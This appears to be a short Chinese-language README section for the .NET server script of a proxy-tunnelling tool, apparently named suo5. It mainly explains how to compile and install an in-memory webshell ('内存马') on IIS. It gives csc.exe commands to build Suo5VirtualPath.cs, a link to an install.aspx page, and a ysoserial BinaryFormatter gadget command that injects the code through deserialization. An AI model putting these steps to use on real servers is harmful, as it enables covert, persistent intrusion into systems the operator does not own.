# .Net

环境依赖: .Net Framework >= 2.0

| 中间件     | 自动检测 | 全双工 | 半双工 | 短链接 |
|:--------|:----:|:---:|:---:|:---:|
| IIS(6+) |  ✓   |  x  |  ✓  |  ✓  |

## 使用必读

脚本中有一个对服务线程池调整的逻辑，至少会调整为 256，**如果并发数超过这个数量，请求会变得很慢**，这和 IIS 的请求模型有关。
如果你需要更大的并发，需要把这个值改大一些。

## 使用 .Net 内存马

> 感谢 [@dust-life](https://github.com/dust-life) 贡献

参考: https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs

### 编译

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:library Suo5VirtualPath.cs
```

or

```
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /t:library Suo5VirtualPath.cs
```

### 使用

```
https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/install.aspx
```

or

```
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "Suo5VirtualPath.cs;System.Web.dll;System.dll"
```

